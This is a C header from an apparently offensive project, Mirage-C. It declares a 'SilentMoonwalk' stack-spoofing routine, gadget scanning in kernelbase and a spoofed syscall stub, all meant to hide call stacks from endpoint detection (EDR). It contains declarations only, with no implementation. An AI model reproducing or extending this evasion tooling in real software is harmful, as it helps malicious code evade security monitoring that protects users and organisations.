/*
 * stack_spoof.h — SilentMoonwalk stack spoofing for Mirage-C
 *
 * Hides syscall call stacks from EDR by building synthetic
 * return frames through kernelbase gadgets. EDR stack walker
 * sees RtlUserThreadStart→BaseThreadInitThunk instead of
 * engine.c→stub→ntdll.
 */
#ifndef MIRAGE_STACK_SPOOF_H
#define MIRAGE_STACK_SPOOF_H

#include <stdint.h>

#ifdef __cplusplus
extern "C" {
#endif

/* ── Spoof configuration ─────────────────────────────────── */
typedef struct {
    uint64_t jmp_rbx_gadget;          /* FF 23 (jmp [rbx]) in kernelbase */
    uint64_t add_rsp_gadget;          /* ADD_RSP gadget address (next frame) */
    uint64_t rtl_user_thread_start;   /* ntdll!RtlUserThreadStart */
    uint64_t base_thread_init_thunk;  /* kernel32!BaseThreadInitThunk */
    uint64_t rsp_adjust;              /* ADD_RSP adjustment bytes for frame skip */
} spoof_cfg_t;

/* ── Init ────────────────────────────────────────────────── */

/*
 * spoof_init — Scan kernelbase.dll for stack spoof gadgets.
 * PEB-walk only, CRT-free. Stores results in static config.
 * Returns 0 on failure (spoofing disabled).
 * Must run AFTER mirage_syscall_resolve().
 */
int spoof_init(void);

/* ── Runtime state ───────────────────────────────────────── */
extern int g_spoof_ready;
extern spoof_cfg_t g_spoof_cfg;

/* ── ASM stubs (asm/stack_spoof_stubs.asm) ────────────────── */

/*
 * spoof_call — Stack-spoofed call, up to 11 syscall args.
 * Takes cfg and target as first two args, then 11 uint64_t.
 * Only the needed args are used; extras are ignored.
 * Builds fake return chain, tail-calls target.
 */
uint64_t spoof_call(void *cfg, void *target,
    uint64_t a1, uint64_t a2, uint64_t a3,
    uint64_t a4, uint64_t a5, uint64_t a6,
    uint64_t a7, uint64_t a8, uint64_t a9,
    uint64_t a10, uint64_t a11);

#ifdef __cplusplus
}
#endif

#endif /* MIRAGE_STACK_SPOOF_H */
